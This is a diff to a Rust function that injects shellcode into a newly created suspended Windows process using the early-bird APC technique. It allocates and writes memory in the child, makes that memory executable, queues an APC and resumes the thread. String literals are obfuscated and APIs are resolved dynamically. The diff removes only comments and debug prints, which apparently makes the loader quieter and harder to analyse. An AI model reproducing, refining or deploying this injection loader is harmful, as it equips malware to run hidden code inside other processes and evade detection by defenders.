@@ -40,15 +40,12 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     let create_process_w: CreateProcessWFn = transmute(p_create_process_w);
     let resume_thread: ResumeThreadFn = transmute(p_resume_thread);
 
-    // close_handle
     let p_close_handle = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
     type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
     let close_handle: CloseHandleFn = transmute(p_close_handle);
 
-    // Shellcode bytes
     let shellcode = std::slice::from_raw_parts(p as *const u8, size);
 
-    // Create child process in suspended state
     let program_str = target_program;
     let mut program_w: Vec<u16> = program_str.encode_utf16().collect();
     program_w.push(0);
@@ -56,10 +53,8 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();
     let mut startup_info: STARTUPINFOW = std::mem::zeroed();
     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-    // startup_info.dwFlags = 0x00000100; // STARTF_USESTDHANDLES - Removed to avoid issues with uninitialized handles
     startup_info.wShowWindow = 1;
 
-    //println!("[-] Creating process: {}", program_str);
     let ret = create_process_w(
         null(),
         program_w.as_mut_ptr(),
@@ -75,9 +70,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
     if ret == 0 {
         return Err(obf_lit!("CreateProcessW failed").to_string());
     }
-    //println!("[-] Process created. PID: {}", proc_info.dwProcessId);
 
-    // Allocate memory in child process
     let addr = virtual_alloc_ex(
         proc_info.hProcess as *mut c_void,
         null(),
@@ -90,9 +83,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
         close_handle(proc_info.hThread);
         return Err(obf_lit!("VirtualAllocEx failed").to_string());
     }
-    //println!("[-] Memory allocated at: {:p}", addr);
 
-    // Write shellcode to child process
     let mut written = 0;
     let ret_write = write_process_memory(
         proc_info.hProcess as *mut c_void,
@@ -106,9 +97,7 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
         close_handle(proc_info.hThread);
         return Err(obf_lit!("WriteProcessMemory failed").to_string());
     }
-    //println!("[-] Shellcode written. Bytes: {}", written);
 
-    // Change memory permissions to RX
     let mut old_protect = PAGE_READWRITE;
     let ret_protect = virtual_protect_ex(
         proc_info.hProcess as *mut c_void,
@@ -123,7 +112,6 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
         return Err(obf_lit!("VirtualProtectEx failed").to_string());
     }
 
-    // QueueUserAPC
     let apc_fn: unsafe extern "system" fn(usize) = transmute(addr);
     let ret_apc = queue_user_apc(Some(apc_fn), proc_info.hThread as *mut c_void, 0);
     if ret_apc == 0 {
@@ -131,18 +119,14 @@ pub unsafe fn exec(p: usize, size: usize, target_program: &str) -> Result<(), St
         close_handle(proc_info.hThread);
         return Err(obf_lit!("QueueUserAPC failed").to_string());
     }
-    //println!("[-] APC queued.");
 
-    // Resume the child process
     let ret_resume = resume_thread(proc_info.hThread as *mut c_void);
     if ret_resume == 0xFFFFFFFF {
         close_handle(proc_info.hProcess);
         close_handle(proc_info.hThread);
         return Err(obf_lit!("ResumeThread failed").to_string());
     }
-    //println!("[-] Thread resumed. Injection complete.");
 
-    // Close handles
     close_handle(proc_info.hProcess);
     close_handle(proc_info.hThread);
 
